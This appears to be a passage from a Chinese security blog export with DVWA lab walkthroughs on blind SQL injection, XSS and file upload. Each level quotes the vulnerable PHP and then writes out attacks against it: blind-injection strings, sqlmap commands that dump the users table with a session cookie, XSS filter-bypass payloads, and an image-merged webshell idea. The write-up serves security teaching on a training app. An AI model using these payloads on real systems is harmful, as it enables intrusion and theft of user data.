attack\n爆破完成后点击length\n这里100的长度和其他的都不一样，那么第一位就对应的ascii码就是100，100对应的是d，所以第一位就d\n爆破后面的字符，比方说第二位\n就改成1' and ascii(substr(database(),2,1))=97 #\nSQLMAP法 输入user id并submit，查看拦截到的请求。\n可以看到是一条GET请求，url \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026quot;\n我们直接放到salmap测试一下，使用-u命令 python sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026quot;\n可以看到这里是需要登录的，否则跑不出来。所以我们需要添加一个cookie维持登录\n获取登录的cookie,添加\u0026ndash;dbs 爆数据 python sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026quot; --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; --batch\n输出：sqlmap拿到了所有数据库名称\n用sqlmap获取当前数据库名称\n输入：python sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026quot; --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; --batch --current-db\n输出：当前数据库名称为dvwa\n用sqlmap获取当前数据库中的所有表名\n输入python sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026quot; --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; --batch -D dvwa --tables\n输出：表名为guestbook和users\n用sqlmap获取users表中的所有数据\n输入：python sqlmap.py -u \u0026quot;http://192.168.138.128/DVWA-master/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026quot; --cookie=\u0026quot;security=low; PHPSESSID=2mcr71ntvn40l57l8miligshm5\u0026quot; --batch -D dvwa -T users --dump\nMedium 贴一下代码先\n\u0026lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $id = $_POST[ 'id' ]; $id = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $id ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Check database $getid = \u0026quot;SELECT first_name, last_name FROM users WHERE user_id = $id;\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num \u0026gt; 0 ) { // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID exists in the database.\u0026lt;/pre\u0026gt;'; } else { // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID is MISSING from the database.\u0026lt;/pre\u0026gt;'; } //mysql_close(); } ?\u0026gt;  可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\n\\x00,\\n,\\r,,',\u0026quot;,\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。\n和SQL注入Medium一样\n虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。\n这里只简单写几个\n首先是基于布尔的盲注：\n抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符； 抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符； 抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0x7573657273)=8 #，（0x7573657273为users的16进制），显示存在，说明uers表有8个字段。  然后是基于时间的盲注：\n抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符； 抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符； 抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0x7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。  High 贴一下代码\n\u0026lt;?php if( isset( $_COOKIE[ 'id' ] ) ) { // Get input $id = $_COOKIE[ 'id' ]; // Check database $getid = \u0026quot;SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num \u0026gt; 0 ) { // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID exists in the database.\u0026lt;/pre\u0026gt;'; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID is MISSING from the database.\u0026lt;/pre\u0026gt;'; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } ?\u0026gt;  可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。\n虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只使用基于布尔的盲注：\n抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符； 抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符； 抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #，（0x7573657273 为users的16进制），显示存在，说明uers表有8个字段。  Impossible \u0026lt;?php if( isset( $_GET[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-\u0026gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-\u0026gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-\u0026gt;execute(); // Get results if( $data-\u0026gt;rowCount() == 1 ) { // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID exists in the database.\u0026lt;/pre\u0026gt;'; } else { // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID is MISSING from the database.\u0026lt;/pre\u0026gt;'; } } } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwasql%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8/","tags":["DVWA"],"title":"从DVWA看SQL Injection (Blind) 盲注"},{"content":"XSS Reflected Low 贴下代码先\n\u0026lt;?php header (\u0026quot;X-XSS-Protection: 0\u0026quot;); // Is there any input? if( array_key_exists( \u0026quot;name\u0026quot;, $_GET ) \u0026amp;\u0026amp; $_GET[ 'name' ] != NULL ) { // Feedback for end user echo '\u0026lt;pre\u0026gt;Hello ' . $_GET[ 'name' ] . '\u0026lt;/pre\u0026gt;'; } ?\u0026gt;  未进行过滤，这里构造一个常用payload\npayload：\u0026lt;script\u0026gt;alert(\u0026quot;x\u0026quot;);\u0026lt;/script\u0026gt;\nMedium \u0026lt;?php header (\u0026quot;X-XSS-Protection: 0\u0026quot;); // Is there any input? if( array_key_exists( \u0026quot;name\u0026quot;, $_GET ) \u0026amp;\u0026amp; $_GET[ 'name' ] != NULL ) { // Get input $name = str_replace( '\u0026lt;script\u0026gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \u0026quot;\u0026lt;pre\u0026gt;Hello ${name}\u0026lt;/pre\u0026gt;\u0026quot;; } ?\u0026gt;  这里用到了一个函数：\n str_replace()函数，以其他字符替换字符串中的一些字符（区分大小写）  这里可以使用大小写绕过、双写绕过\nPayload：\n \u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;alert(\u0026quot;x\u0026quot;);\u0026lt;/script\u0026gt; \u0026lt;Script\u0026gt;alert(\u0026quot;x\u0026quot;)\u0026lt;/SCript\u0026gt;  High \u0026lt;?php header (\u0026quot;X-XSS-Protection: 0\u0026quot;); // Is there any input? if( array_key_exists( \u0026quot;name\u0026quot;, $_GET ) \u0026amp;\u0026amp; $_GET[ 'name' ] != NULL ) { // Get input $name = preg_replace( '/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \u0026quot;\u0026lt;pre\u0026gt;Hello ${name}\u0026lt;/pre\u0026gt;\u0026quot;; } ?\u0026gt;  这里的主要函数为：preg_replace() 执行一个正则表达式的搜索和替换\n通过正则匹配特征标签进行过滤，$name = preg_replace( ‘/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i’, ‘’, $_GET[ ‘name’ ] ); 对任何模式的script都过滤了\n这里使用其他标签绕过：\npayload：\u0026lt;img src=0 onerror=alert(\u0026quot;xss\u0026quot;)\u0026gt; \nImpossible \u0026lt;?php // Is there any input? if( array_key_exists( \u0026quot;name\u0026quot;, $_GET ) \u0026amp;\u0026amp; $_GET[ 'name' ] != NULL ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \u0026quot;\u0026lt;pre\u0026gt;Hello ${name}\u0026lt;/pre\u0026gt;\u0026quot;; } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符\u0026amp;、”、 ’、\u0026lt;、\u0026gt;转换为 HTML 实体， 防止浏览器将其作为HTML元素。 可以看出，impossible级别的代码先判断name是否为空，不为空的话然后验证其token，来防范CSRF攻击。 然后再用\thtmlspecialchars函数将name中的预定义字符转换成html实体，这样就防止了我们填入标签 当我们输入 \u0026lt;script\u0026gt;alert('hack')\u0026lt;/script\u0026gt; 时，因为 htmlspecialchars 函数会将 \u0026lt; 和 \u0026gt; 转换成html实体,并且${name}取的是$name的值， 然后包围在\u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt;标签中被打印出来，所以我们插入的语句并不会被执行。 当我们提交\u0026lt;script\u0026gt;alert(\u0026quot;hack\u0026quot;);\u0026lt;/script\u0026gt;时，通过可以查看源代码，表单提交的过程中，把我们的user_token也一并提交了， 来和服务器端的session_token做验证，防止CSRF攻击。我们输入的代码，直接被当成html文本给打印出来了，并不会被当成js脚本执行  XSS Stored Low \u0026lt;?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $message ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Sanitize name input $name = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $name ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Update database $query = \u0026quot;INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); //mysql_close(); } ?\u0026gt;  函数解释\n**trim(string,charlist)**函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括\\0、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符。\n**mysqli_real_escape_string(string,connection)**函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，'，\u0026quot;，\\x1a）进行转义。\n**stripslashes(string)**函数删除字符串中的反斜杠。\n可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞\n构造payload:\tname=1 massage=\u0026lt;script\u0026gt;alert(\u0026quot;x\u0026quot;);\u0026lt;/script\u0026gt;  成功\nMedium \u0026lt;?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $message ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '\u0026lt;script\u0026gt;', '', $name ); $name = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $name ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Update database $query = \u0026quot;INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); //mysql_close(); } ?\u0026gt;  strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，（未过滤使用\u0026lt;b\u0026gt;标签）。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数 注入XSS代码，但是对于name参数，只是简单过滤了\u0026lt;script\u0026gt;字符串，仍然存在存储型的XSS。  这里对长度限制了，所以F12更改即可。\n 双写绕过  构造payload：name = \u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;alert(\u0026quot;x\u0026quot;);\u0026lt;/script\u0026gt; message =132  大小写绕过  构造payload：name = \u0026lt;sCrIPt\u0026gt;alert(\u0026quot;x\u0026quot;);\u0026lt;/sCrIpT\u0026gt; message = 123  其他标签绕过  构造payload：name = \u0026lt;img src=0 onerror=alert(\u0026quot;xss\u0026quot;)\u0026gt; message = 123  High \u0026lt;?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $message ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $name ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Update database $query = \u0026quot;INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); //mysql_close(); } ?\u0026gt;  可以看到，这里使用正则表达式过滤了、\u0026lt;script\u0026gt;标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。\n img标签  构造payload：name = \u0026lt;img src=0 onerror=alert(\u0026quot;xss\u0026quot;)\u0026gt; message = 123  iframe标签  构造payload：name = \u0026lt;iframe onload=alert(\u0026quot;xss\u0026quot;)\u0026gt; message = 123  Impossible \u0026lt;?php if( isset( $_POST[ 'btnSign' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $message ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $name ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-\u0026gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-\u0026gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-\u0026gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-\u0026gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  可以看到，通过使用htmlspecialchars函数将几种特殊字符转义为HTML实体，mysqli_real_escape_string函数对单引号\u0026rsquo;转义，防止进行SQL注入,彻底防治了存储型 XSS 的利用和危害。这段话可以做针对xss防护加固的建议。\nXSS DOM 全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。\nDOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。\n在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。\nLow \u0026lt;?php # No protections, anything goes ?\u0026gt;  可以发现并无任何保护措施，直接尝试注入\n直接在URL处输入，default=\u0026lt;script\u0026gt;alert(/xss/)\u0026lt;/script\u0026gt;\nMedium \u0026lt;?php // Is there any input? if ( array_key_exists( \u0026quot;default\u0026quot;, $_GET ) \u0026amp;\u0026amp; !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \u0026quot;\u0026lt;script\u0026quot;) !== false) { header (\u0026quot;location: ?default=English\u0026quot;); exit; } } ?\u0026gt;  可以看到源码里面，针对\u0026lt;script\u0026gt;字段进行了过滤，略微加强了防护，但依旧可以攻破,闭合换其他标签即可\n?default=English\u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;img src='x' onerror='alert(1)'\u0026gt;  High \u0026lt;?php // Is there any input? if ( array_key_exists( \u0026quot;default\u0026quot;, $_GET ) \u0026amp;\u0026amp; !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \u0026quot;French\u0026quot;: case \u0026quot;English\u0026quot;: case \u0026quot;German\u0026quot;: case \u0026quot;Spanish\u0026quot;: # ok break; default: header (\u0026quot;location: ?default=English\u0026quot;); exit; } } ?\u0026gt;  查看服务器端源代码，可以发现default=只允许是French、English、German、Spanish、这几个通过。（采用了白名单过滤）\n使用#定位符，#号后面的字符不会提交给PHP服务器。输入：\n?default=English#\u0026lt;script\u0026gt;alert(/xss/)\u0026lt;/script\u0026gt;  Impossible \u0026lt;?php # Don't need to do anything, protction handled on the client side ?\u0026gt;  无解\u0026hellip;\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwaxss/","tags":["DVWA"],"title":"从DVWA看XSS"},{"content":"File Upload File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。\nLow \u0026lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026quot;hackable/uploads/\u0026quot;; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;'; } else { // Yes! echo \u0026quot;\u0026lt;pre\u0026gt;{$target_path} succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026quot;; } } ?\u0026gt;  basename(path,suffix)\n函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。\n可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。\n漏洞利用 文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。\n\u0026lt;?php phpinfo(); ?\u0026gt;  Medium \u0026lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026quot;hackable/uploads/\u0026quot;; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \u0026quot;image/jpeg\u0026quot; || $uploaded_type == \u0026quot;image/png\u0026quot; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;'; } else { // Yes! echo \u0026quot;\u0026lt;pre\u0026gt;{$target_path} succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026quot;; } } else { // Invalid file echo '\u0026lt;pre\u0026gt;Your image was not uploaded. We can only accept JPEG or PNG images.\u0026lt;/pre\u0026gt;'; } } ?\u0026gt;  可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。\n漏洞利用 抓包修改文件类型\n上传hack.png文件，抓包。\n上传成功\nHigh \u0026lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026quot;hackable/uploads/\u0026quot;; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \u0026quot;jpg\u0026quot; || strtolower( $uploaded_ext ) == \u0026quot;jpeg\u0026quot; || strtolower( $uploaded_ext ) == \u0026quot;png\u0026quot; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo '\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;'; } else { // Yes! echo \u0026quot;\u0026lt;pre\u0026gt;{$target_path} succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026quot;; } } else { // Invalid file echo '\u0026lt;pre\u0026gt;Your image was not uploaded. We can only accept JPEG or PNG images.\u0026lt;/pre\u0026gt;'; } } ?\u0026gt;  strrpos(string,find,start)\n函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。\ngetimagesize(string filename)\n函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。\n可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg” 、”.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。\n漏洞利用 我们可以制作图片马\n首先利用copy将一句话木马文件php.php与图片文件1.jpg合并\n上传成功\nImpossible \u0026lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) \u0026amp;\u0026amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 